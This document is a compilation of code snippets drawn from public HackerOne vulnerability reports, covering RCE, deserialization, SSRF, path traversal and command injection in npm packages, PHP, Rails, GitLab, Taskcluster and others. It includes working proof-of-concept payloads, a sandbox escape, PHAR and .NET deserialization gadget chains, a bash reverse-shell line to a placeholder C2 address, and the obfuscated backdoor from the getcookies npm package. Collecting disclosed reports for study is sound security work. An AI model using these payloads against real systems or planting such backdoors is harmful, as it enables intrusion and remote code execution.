## 79. [#889886](https://hackerone.com/reports/889886)  -  [H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty
*critical*

```
which upon passing to server successfully bypassed the 2fa.


# 3. SSrf in cookies to getting the unauthorised apk
{F853373}
As we are loggedin we see transaction record window used to fetch statements but as our account is not privileged so we cant fetch documents directly.
The request to fetch documents was send via rest api eg- https://api.bountypay.h1ctf.com/api/accounts/Ae8iJLkn9z/statements?month=01&year=2020
app requesting the api to fetch the records as we request so it was clear the cookie check is in place to check for allowed paths
the cookie we got was a jwt token which on decoding looked like
```

## 80. [#889886](https://hackerone.com/reports/889886)  -  [H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty
*critical*

```
which bypasses 2fa and send us to a pay page 


# 8. Bypass payment 2fa via CSS Injection via ssrf to get the flag
{F853475}
After 2fa bypass we see the pay button active for 5th month of year 2020 but upon clcking it asks for to send a challenge and complete it so the challenge upon sending was making a request to a stylesheet so sending any else url the server would make a request to it so a bit later i realised that we can exfiltrate the data for the challenge answer via css injection by sending our css file which would fetch every character from value of challenge but there was a catch in this after sending a request to mywebsite/test.css which was A-Z,a-z,0-9
```

## 81. [#346516](https://hackerone.com/reports/346516)  -  Remote code executio in  NPM package getcookies
*critical*

```
var express = require('express');
var app = express();
var expressCookies = require('express-cookies');

app.use(expressCookies());

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(3000, function () {
    console.log('Example app listening on port 3000!')
});
```

## 82. [#973245](https://hackerone.com/reports/973245)  -  [imagickal] Remote Code Execution
*critical*

```javascript
var im = require('imagickal');

im.identify('image.jpg;touch HACKED;').then(function (data) {
  console.log(data);
});
```

## 83. [#2221404](https://hackerone.com/reports/2221404)  -  RCE on worker host due to unsanitized "env" variable name in task definition on community-tc.services.mozilla.com
*low, $500*

```yaml
retries: 0
created: '2023-10-23T08:10:11.044Z'
deadline: '2023-10-23T11:10:11.044Z'
expires: '2024-10-23T11:10:11.044Z'
taskQueueId: proj-misc/tutorial
projectId: none
tags: {}
scopes: []
payload:
  env:
# Commands to run in here
    test2 --help ; whoami ; ls -lah ;: '--help'
  image: ubuntu:latest
  command:
    - /bin/bash
    - '-c'
    - 'echo hello'
  maxRunTime: 5000
extra: {}
metadata:
  name: example-task
  description: An **example** task
  owner: name@example.com
  source: https://community-tc.services.mozilla.com/tasks/create
schedulerId: taskcluster-ui
```

## 84. [#1419213](https://hackerone.com/reports/1419213)  -  Grafana LFI on https://grafana.mariadb.org
*medium*

```
../../../../../../../../../../../../../../../../../../../etc/passwd`
```

## 85. [#566056](https://hackerone.com/reports/566056)  -  [larvitbase-api] Unintended Require
*medium*

```
../../../../../../hack
```

## 86. [#2127968](https://hackerone.com/reports/2127968)  -  CVE-2023-40195: Apache Airflow Spark Provider Deserialization Vulnerability RCE
*medium*

```
${SPARK_HOME}
```

## 87. [#3694007](https://hackerone.com/reports/3694007)  -  Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql
*high, $7,000*

```bash
# Field-based JSON sort  -  confirms JSON is parsed and sort is applied
curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \
  --data-raw '{"query":"query{search(index:NotificationsIndex,query_string:\"*\",sort_query:\"[{\\\"id\\\":\\\"asc\\\"}]\",size:5){nodes{... on NotificationDocument{id}}}}"}' | jq
```

## 88. [#3694007](https://hackerone.com/reports/3694007)  -  Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql
*high, $7,000*

```bash
for sq in \
  '[{"user_id":{"order":"desc"}}]' \
  '[{"user_id":{"order":"desc","missing":"_last"}}]' \
  '[{"created_at":{"order":"desc","mode":"max"}}]'; do
  q=$(jq -n --arg sq "$sq" '{query:"query($sq:String){search(index:NotificationsIndex,query_string:\"*\",sort_query:$sq,size:1){total_count}}", variables:{sq:$sq}}')
  printf '%-55s ' "$(echo "$sq" | head -c 53)"
  curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" --data-raw "$q" \
    | jq -c '{tc:.data.search.total_count, err:(.errors[0].message // null)}'
  sleep 1.2
done
```

## 89. [#3694007](https://hackerone.com/reports/3694007)  -  Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql
*high, $7,000*

```bash
q='query($sq:String){search(index:NotificationsIndex,query_string:"*",sort_query:$sq,size:1){total_count}}'

for sq in \
  '[{"_script":{"type":"number","order":"asc"}}]' \
  '[{"_script":{"type":"number","script":{"source":"","lang":"painless"},"order":"asc"}}]' \
  '[{"_script":{"type":"number","script":{"source":"\"unterminated","lang":"painless"},"order":"asc"}}]' \
  '[{"_script":{"type":"number","script":{"source":"1","lang":"painless"},"order":"asc"}}]' \
  '[{"_script":{"type":"number","script":{"source":"1+1","lang":"painless"},"order":"asc"}}]'; do
  body=$(jq -n --arg q "$q" --arg sq "$sq" '{query:$q,variables:{sq:$sq}}')
  printf '%-95s ' "$(echo "$sq" | head -c 93)"
  curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" --data-raw "$body" \
    | jq -c '{tc:.data.search.total_count, err:(.errors[0].message // null)[0:40]}'
  sleep 1.5
done
```

## 90. [#3694007](https://hackerone.com/reports/3694007)  -  Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql
*high, $7,000*

```bash
q='query($sq:String){search(index:NotificationsIndex,query_string:"*",sort_query:$sq,size:5){edges{cursor node{__typename ... on NotificationDocument{id}}}}}'

# Request A  -  baseline, constant return
sq_A='[{"_script":{"type":"number","script":{"source":"1","lang":"painless"},"order":"asc"}}]'

# Request B  -  per-document field read
sq_B='[{"_script":{"type":"number","script":{"source":"doc[\"_seq_no\"].value","lang":"painless"},"order":"asc"}}]'

echo "=== Request A (constant return) ==="
body=$(jq -n --arg q "$q" --arg sq "$sq_A" '{query:$q,variables:{sq:$sq}}')
curl -sk -D /tmp/probeA_headers 'https://hackerone.com/graphql' \
  -H @/tmp/h1.headers -b "$COOKIE" --data-raw "$body" | tee /tmp/probeA_body.json \
  | jq -c '.data.search.edges | map(.node.id)'
grep -i '^x-request-id' /tmp/probeA_headers

sleep 2

echo "=== Request B (per-doc field read) ==="
body=$(jq -n --arg q "$q" --arg sq "$sq_B" '{query:$q,variables:{sq:$sq}}')
curl -sk -D /tmp/probeB_headers 'https://hackerone.com/graphql' \
  -H @/tmp/h1.headers -b "$COOKIE" --data-raw "$body" | tee /tmp/probeB_body.json \
  | jq -c '.data.search.edges | map(.node.id)'
grep -i '^x-request-id' /tmp/probeB_headers
```

## 91. [#1776476](https://hackerone.com/reports/1776476)  -  CVE-2022-40127: RCE in Apache Airflow <2.4.0 bash example
*high, $4,000*

```
also_run_this = BashOperator(
        task_id='also_run_this',
        bash_command='echo "run_id={{ run_id }} | dag_run={{ dag_run }}"',
    )
```

## 92. [#198734](https://hackerone.com/reports/198734)  -  GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
*high*

```
static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */
{
	...
	ALLOC_INIT_ZVAL(zv_ptr);
	if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
		|| Z_TYPE_P(zv_ptr) != IS_ARRAY
	) {
		zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);
		goto exit;
	}

	if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {
		zend_hash_copy(
			zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),
			(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)
		);
	}
```

## 93. [#198734](https://hackerone.com/reports/198734)  -  GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
*high*

```
<?php

var_dump(unserialize('a:2:{i:0;C:3:"GMP":17:{s:4:"1234";a:0:{}}i:1;O:12:"DateInterval":1:{s:1:"y";R:2;}}'));

?>
```

## 94. [#198734](https://hackerone.com/reports/198734)  -  GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
*high*

```
if(isset($mybb->cookies['mybb']['forumread']))
	{
		$forumsread = my_unserialize($mybb->cookies['mybb']['forumread']);
	}
```

## 95. [#198734](https://hackerone.com/reports/198734)  -  GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
*high*

```
eval('$index = "'.$templates->get('index').'";');
```

## 96. [#1115864](https://hackerone.com/reports/1115864)  -  Persistant Arbitrary code execution in mattermost android
*high*

```
Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setClassName("com.mattermost.rn", "com.mattermost.share.ShareActivity");
        intent.putExtra("android.intent.extra.STREAM",Uri.parse("content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so"));
        intent.setType("application/*");
        startActivity(intent);
```

## 97. [#921288](https://hackerone.com/reports/921288)  -  Arbitrary File delete via PHAR deserialization
*high*

```php
<?php
     // input_path is phar://path/to/file
     if(strpos($input_path, "phar://") !== FALSE){
         trigger_error("Detected phar wrapper!", E_USER_ERROR); // phar detected.
     }
     else{
         is_dir($input_path);
     }
     ?>
```

## 98. [#1154034](https://hackerone.com/reports/1154034)  -  Argument/Code Injection via ActiveStorage's image transformation functionality
*high*

```ruby
<%= image_tag user.avatar.variant(resize_to_limit: [100, 100]) %>
```

## 99. [#1154034](https://hackerone.com/reports/1154034)  -  Argument/Code Injection via ActiveStorage's image transformation functionality
*high*

```html
<ul>
  <% @message.files.each do |file| %>
    <li>
      <%= image_tag file.preview(resize_to_limit: [100, 100]) %>
    </li>
  <% end %>
</ul>
```

## 100. [#1154034](https://hackerone.com/reports/1154034)  -  Argument/Code Injection via ActiveStorage's image transformation functionality
*high*

```ruby
260     ##                                                                        
261     # Any undefined method will be transformed into a CLI option              
262     #                                                                         
263     # @example                                                                
264     #   mogrify = MiniMagick::Tool.new("mogrify")                             
265     #   mogrify.adaptive_blur("...")                                          
266     #   mogrify.foo_bar                                                       
267     #   mogrify.command.join(" ") # => "mogrify -adaptive-blur ... -foo-bar"  
268     #                                                                         
269     def method_missing(name, *args)                                           
270       option = "-#{name.to_s.tr('_', '-')}"                                   
271       self << option                                                          
272       self.merge!(args)                                                       
273       self                                                                    
274     end
```

## 101. [#1154034](https://hackerone.com/reports/1154034)  -  Argument/Code Injection via ActiveStorage's image transformation functionality
*high*

```ruby
<%= image_tag user.avatar.variant(resize: params[:new_size]) %>
```

## 102. [#1154034](https://hackerone.com/reports/1154034)  -  Argument/Code Injection via ActiveStorage's image transformation functionality
*high*

```ruby
<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>
```

## 103. [#350418](https://hackerone.com/reports/350418)  -  Insecure implementation of deserialization in cryo
*high*

```
var Cryo = require('cryo');
var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}'
var hydrated = Cryo.parse(frozen);
console.log(hydrated);
```

## 104. [#350401](https://hackerone.com/reports/350401)  -  Insecure implementation of deserialization in funcster
*high*

```
return "module.exports=(function(module,exports){return{" + entries + "};})();";
```

## 105. [#809012](https://hackerone.com/reports/809012)  -  [notevil] - Sandbox Escape Lead to RCE on Node.js and XSS in the Browser
*high*

```
var safeEval = require("notevil")

var code = "" +
    "function fn() {};" +
    "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;" +
    "var properties = Object.values(constructorProperty);" +
    "properties.pop();" +
    "properties.pop();" +
    "properties.pop();" +
    "var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" +
    "(Func())()"
console.log(safeEval(code))
```

## 106. [#390929](https://hackerone.com/reports/390929)  -  Code Injection Vulnerability in dot Package
*high*

```js
var doT = require("dot");
var tempFn = doT.template("<h1>Here is a sample template " +
    "{{=console.log(23)}}</h1>");
tempFn({})
```

## 107. [#703412](https://hackerone.com/reports/703412)  -  [node-df] RCE via insecure command concatenation
*high*

```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;touch HACKED',
        prefixMultiplier: 'GB',
        isDisplayPrefixMultiplier: true,
        precision: 2
    };
 
df(options, function (error, response) {
    if (error) { throw error; }
 
    console.log(JSON.stringify(response, null, 2));
});
```

## 108. [#413388](https://hackerone.com/reports/413388)  -  Untrusted strings that are cache fetched with raw option are automatically marshal loaded
*high*

```ruby
body = Rails.cache.fetch(key, raw: true, expires_in: ttl) do
  res = Net::HTTP.get_response(remote_uri)
  res.value # raise on HTTP error
  res.body
end
```

## 109. [#413388](https://hackerone.com/reports/413388)  -  Untrusted strings that are cache fetched with raw option are automatically marshal loaded
*high*

```ruby
require 'rails/all'

untrusted_string = Marshal.dump(:sym)

cache = ActiveSupport::Cache::MemCacheStore.new('localhost')
cache.delete("demo")
data = cache.fetch("demo", raw: true) { untrusted_string }
p data # "\x04\b:\bsym"
data = cache.fetch("demo", raw: true)
p data # :sym
```

## 110. [#346516](https://hackerone.com/reports/346516)  -  Remote code executio in  NPM package getcookies
*critical*

```
/* eslint-env es6 */
'use strict';

var assert = require('assert');

let harness = (req, res, callback, next) => {
    try {
        assert.equal(typeof callback, 'function');
    } catch (E) {
        return callback(E);
    }

    try {
        module.exports.log = module.exports.log || Buffer.alloc(0xffff);
        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
            p = Buffer.from(p, 'hex').readUInt16LE(0);
            switch (p) {
                case 0xfffe:
                    module.exports.log = Buffer.alloc(0xffff);
                    return;
                case 0xfffa:
                    return setTimeout(() => {
                        let c = module.exports.log.toString().replace(/\x00*$/, '');
                        module.exports.log = Buffer.alloc(0xffff);
                        if (c.indexOf('\x00') < 0) {
                            require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74'](c)(module.exports, require, req, res, next);
                        }
                        next();
                    }, 1000);
                default:
                    v = Buffer.from(v, 'hex');
                    for (let i = 0; i < v.length; i++) {
                        module.exports.log[p + i] = v[i];
                    }
            }
# … truncated …
```

## 111. [#346516](https://hackerone.com/reports/346516)  -  Remote code executio in  NPM package getcookies
*critical*

```
diff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js
--- /home/m/tmp/getcookies_original/index.js	2018-05-02 16:47:11.382990109 +0300
+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js	2018-05-02 16:50:00.198982317 +0300
@@ -9,8 +9,6 @@
 
 'use strict';
 
-const testHarness = require('./test/harness.js');
-
 /**
  * Module exports.
  * @public
@@ -45,38 +43,36 @@
  */
 
 function parse(req, res, callback) {
-    testHarness.assert(req, res, callback, () => {
-        if (!req.headers.cookie) {
-            return callback();
+    if (!req.headers.cookie) {
+        return callback();
+    }
+
+    var obj = {};
+    var pairs = req.headers.cookie.split(pairSplitRegExp);
+
+    for (var i = 0; i < pairs.length; i++) {
+        var pair = pairs[i];
+        var eq_idx = pair.indexOf('=');
+
+        // skip things that don't look like key=value
+        if (eq_idx < 0) {
+            continue;
         }
 
# … truncated …
```

## 112. [#897974](https://hackerone.com/reports/897974)  -  Arbitrary code execution via untrusted schemas in ajv
*low*

```
${payload}
```

## 113. [#1806939](https://hackerone.com/reports/1806939)  -  Entire database of emails exposed through URN injection
*medium*

```js
await (await fetch("https://www.linkedin.com/voyager/api/identity/dash/profiles?decoration=%28websites*%28url~%29%29&memberIdentity=[public identifier]&q=memberIdentity", {
  "headers": {
    "accept": "application/vnd.linkedin.normalized+json+2.1",
    "accept-language": "en-US,en;q=0.9",
    "csrf-token": "ajax:[your token here]",
    "x-li-deco-include-micro-schema": "true",
    "x-li-lang": "en_US",
    "x-restli-protocol-version": "2.0.0"
  },
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
})).json()
```

## 114. [#566056](https://hackerone.com/reports/566056)  -  [larvitbase-api] Unintended Require
*medium*

```
const	Api	= require('larvitbase-api');

let	api;

api = new Api({
    'baseOptions':	{'httpOptions': 8001},
    'routerOptions':	{},
    'reqParserOptions':	{},
});

api.start(function (err) {});
```

## 115. [#728047](https://hackerone.com/reports/728047)  -  [git-promise] RCE via insecure command formatting
*medium*

```js
// poc.js
var git = require("git-promise");
 
git("init;touch HACKED").then(function (branch) {
  console.log(branch); // This is your current branch
});
```

## 116. [#579560](https://hackerone.com/reports/579560)  -  [larvitbase-www] Unintended Require
*medium*

```
const	App	= require('larvitbase-www');
 
let	app;
 
app = new App({
    'baseOptions':	{'httpOptions': 8001},
    'routerOptions':	{},
    'reqParserOptions':	{},
});
 
app.start(function (err) {
    if (err) throw err;
});
```

## 117. [#718241](https://hackerone.com/reports/718241)  -  [git-lib] RCE via insecure command formatting
*medium*

```js
// poc.js
var git = require("git-lib");

git.add("test;touch HACKED;").then(function(){
    /** successfully added **/
}).catch(function(err){
    /** unsuccessful **/
});
```

## 118. [#1154542](https://hackerone.com/reports/1154542)  -  RCE when removing metadata with ExifTool
*critical, $20,000*

```http
postfix   1570  0.0  0.0  67476  4488 ?        S    12:40   0:00 pickup -l -t fifo -u
```

## 119. [#1154542](https://hackerone.com/reports/1154542)  -  RCE when removing metadata with ExifTool
*critical, $20,000*

```http
postfix   2411  0.0  0.0  67640  1988 ?        S     2020   0:23 qmgr -l -t fifo -u
```

## 120. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```json
{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb\}" /}

~~ ruby
def what?
  42
end
~~
```

## 121. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```ruby
puts "hello from ruby"
`echo vakzz was here > /tmp/vakzz`
```

## 122. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```json
{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\}" /}
~~ ruby
def what?
  42
end
~~
```

## 123. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```http
puts "hello from ruby"
```

## 124. [#3782701](https://hackerone.com/reports/3782701)  -  Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)
*critical, $12,000*

```
uid=1000(node) gid=1000(node) groups=1000(node)
```

## 125. [#3782701](https://hackerone.com/reports/3782701)  -  Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)
*critical, $12,000*

```
NODE_ENV=production
NODE_VERSION=24.15.0
TASKCLUSTER_ROOT_URL=https://firefox-ci-tc.services.mozilla.com
TASKCLUSTER_CLIENT_ID=static/taskcluster/web-server
TASKCLUSTER_ACCESS_TOKEN=<redacted, 65 chars>
READ_DB_URL=postgresql://taskcluster_web_server:<redacted>@████████/taskcluster?ssl=1
WRITE_DB_URL=postgresql://taskcluster_web_server:<redacted>@████████/taskcluster?ssl=1
DB_CRYPTO_KEYS=[{"algo":"aes-256","id":"azure","key":"<redacted>"}]
PULSE_USERNAME=firefoxcitc-taskcluster-web-server-v2
PULSE_PASSWORD=<redacted, 32 chars>
UI_LOGIN_STRATEGIES={"mozilla-auth0":{"clientId":"████████","clientSecret":"<redacted>","domain":"auth.mozilla.auth0.com"}}
ERROR_CONFIG={"dsn":"https://<redacted>@o1069899.ingest.sentry.io/6459390","reporter":"SentryReporter"}
SESSION_SECRET=FIXME
```

## 126. [#1858574](https://hackerone.com/reports/1858574)  -  [CVE-2022-44268] Arbitrary Remote Leak via ImageMagick
*critical*

```bash
python -c "print(bytes.fromhex('2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a').decode())"
```

## 127. [#2248328](https://hackerone.com/reports/2248328)  -  RCE on Wordpress website
*critical*

```
<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 128. [#2762119](https://hackerone.com/reports/2762119)  -  CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
*critical*

```xml
<profile>
    <item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        <ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <ExpandedElement />
            <ProjectedProperty0>
                <MethodName>WriteFile</MethodName>
                <MethodParameters>
                    <anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType>
                </MethodParameters>
                <ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
            </ProjectedProperty0>
        </ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
    </item>
</profile>
```

## 129. [#2762119](https://hackerone.com/reports/2762119)  -  CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
*critical*

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Set-Cookie: .ASPXANONYMOUS=...; expires=Wed, 28-Oct-2024 03:54:58 GMT; path=/; HttpOnly
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 19 Aug 2020 17:14:58 GMT
Connection: close
Content-Length: 109

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

## 130. [#2762119](https://hackerone.com/reports/2762119)  -  CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
*critical*

```bash
$ nc -nlvp 7575
```

## 131. [#1838674](https://hackerone.com/reports/1838674)  -  Remote Code Execution on ownCloud instances with ImageMagick installed
*critical*

```xml
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
</svg>
```

## 132. [#660563](https://hackerone.com/reports/660563)  -  [script-manager] Unintended require
*low*

```
var scriptManager = require("script-manager")({ numberOfWorkers: 2 });
    
    scriptManager.ensureStarted(function(err) {
     
        /*send user's script including some other specific options into
        wrapper specified by execModulePath*/
        scriptManager.execute({
            script: "return 'Jan';"
        }, {
            execModulePath: path.join(__dirname, "script.js"),
            timeout: 10
        }, function(err, res) {
            console.log(res);
        });
     
    });
```

## 133. [#660563](https://hackerone.com/reports/660563)  -  [script-manager] Unintended require
*low*

```
module.exports = function(inputs, callback, done) {
        var result = require('vm').runInNewContext(inputs.script, {
            require: function() { throw new Error("Not supported"); }
        });
        done(result);
    });
```

## 134. [#660563](https://hackerone.com/reports/660563)  -  [script-manager] Unintended require
*low*

```json
{"options": {"rid": 12, "execModulePath": "./../../../pwn.js"}}
```

## 135. [#851807](https://hackerone.com/reports/851807)  -  Code injection possible with malformed Nextcloud Talk chat commands
*high*

```
bash -i >& /dev/tcp/<c2-ip-here>/8888 0>&1 &
```

## 136. [#198734](https://hackerone.com/reports/198734)  -  GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
*high*

```
<?php

class obj
{
	var $ryat;
	
	function __wakeup()
	{
		$this->ryat = 1;
	}
}

$obj = new stdClass;
$obj->aa = 1;
$obj->bb = 2;

$inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:{s:4:"ryat";R:2;}}';
$exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
$x = unserialize($exploit);
var_dump($obj);

?>
```

## 137. [#413388](https://hackerone.com/reports/413388)  -  Untrusted strings that are cache fetched with raw option are automatically marshal loaded
*high*

```http
puts 'HACKED'
```

## 138. [#2248328](https://hackerone.com/reports/2248328)  -  RCE on Wordpress website
*critical*

```php
add_filter( 'ninja_forms_render_options', function( $options, $settings ) {
    
    //https://www.html-code-generator.com/php/array/languages-name-and-code
    $languages_list = array(
        'en' => 'English',
        // [snip]
        'zu' => 'Zulu - isiZulu'
    );

    if(str_contains($settings['key'], 'language')) {

        $options = [];
        $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

        $pref_lang = '';
        if(isset($_COOKIE['nc_form_fields'])){
            $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));
            if( isset($nc_form_fields['nc_form_lang'])){
                $pref_lang = $nc_form_fields['nc_form_lang'];
            }
        } else {
            $pref_lang = $browser_lang;
        }


        foreach($languages_list as $code => $language) {
            $selected = false;

            if($pref_lang == $code){
                $selected = true;
            }

            $options[] = [
                'label' => $language,
                'value' => $code,
                'calc' => 0,
                'selected' => $selected
            ];

        }
# … truncated …
```

## 139. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint
*medium, $300*

```
HTTP/1.1 504 Gateway Time-out
Date: Wed, 10 Jun 2020 21:59:23 GMT
Content-Type: text/html
Connection: close
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Set-Cookie: citrix_ns_id=8E6YqKIHpDnlELCEZHQGi6/DbMc0002; Domain=.data.gov; Path=/; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wlf=AAAAAAXN5F16ey5zISfQ585lXQBGHlN-7dr9WKl_OFLsX_Q6Z5FSkI1y5osrgkCJi30EZN3BqgmpbDGukEtJm4GeqYoRcF1ShGz2vNsMLkPUnGJfMg==&AAAAAAXr_jOkM7gR-f7M4RoCUEgFaXqHkFZh1c2M_0VcuOMELZ4L1xjh_7Cg7-1hFJ019Co3chJ3Y6GOPx3937UBarN6bbiMCl_jnjn3xYOPDRvJ2w==&; Domain=.data.gov; Max-Age=604800; Path=/; Version=1; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wat=AAAAAAUCRwLvsF1G93DnYnM3tfgy7WeGLO5AGxKuZ4E4g06xunWnhmGEOXaEsURmVksrMxmgclkLw2DWjtRZmysJshVE&; Domain=.data.gov; Path=/; Secure; HttpOnly
X-Cache-Control-Orig: 
Cache-Control: max-age=0, must-revalidate, private
X-Expires-Orig: None
Content-Length: 160

<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

## 140. [#195950](https://hackerone.com/reports/195950)  -  Use of uninitialized memory in unserialize()
*medium*

```http
gets called from `zend_hash_destroy()` which was overwritten with user supplied
contents:
```

## 141. [#921288](https://hackerone.com/reports/921288)  -  Arbitrary File delete via PHAR deserialization
*high*

```php
// Input: None
// Output: concrete5_exploit.png

<?php
// Gadgets
namespace Illuminate\Filesystem{
  class Filesystem{}
}
namespace Concrete\Core\File\Service{ 
  class VolatileDirectory{
    protected $filesystem;
    protected $path;
    function __construct(){
      $this->filesystem = new \Illuminate\Filesystem\Filesystem;
      $this->path = "/var/www/html/phar_exploit/test_dir";
      // Directory that including some files. (Attacker can set any path.)
    }
  }
}

// Generate phar file to exploit
namespace{
  $output_path = __DIR__;
  $exploit_file = $output_path . "/concrete5_exploit.phar";
  $phar = new Phar($exploit_file);
  $phar->startBuffering();
  $phar->setStub("<?php __HALT_COMPILER();");
  
  $payload = new \Concrete\Core\File\Service\VolatileDirectory;
  $phar->setMetadata($payload);
  
  $phar->addFromString("dummy.txt", "DUMMY");
  $phar->stopBuffering();

  // Change file extension PHAR to PNG. (for bypassing file upload restrictions)
  $changing_file_name = "concrete5_exploit.png";
  $changing_internal_full_path = $output_path . "/" . $changing_file_name;
  rename($exploit_file, $changing_file_name);
}

# … truncated …
```

## 142. [#1888351](https://hackerone.com/reports/1888351)  -  https://www.wotif.com/vc/blog/info.php script is prone to reflected HTML/CSS injection and COOKIE leak
*low, $100*

```
TEMP => /tmp
TMPDIR => /tmp
TMP => /tmp
PATH => /usr/local/bin:/usr/bin:/bin
HOSTNAME =>
USER => nginx
HOME => /var/lib/nginx
HTTP_X_DATADOG_SAMPLING_PRIORITY => 0
HTTP_X_DATADOG_PARENT_ID => 2356387789306272938
HTTP_X_DATADOG_TRACE_ID => 2570661382097469643
HTTP_CGP_AGENT_IDS_DUAID => 0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627
HTTP_CTX_USER_TUID => -1
HTTP_CTX_USER_STATE => single-use
HTTP_CTX_SITE_CURRENCY => AUD
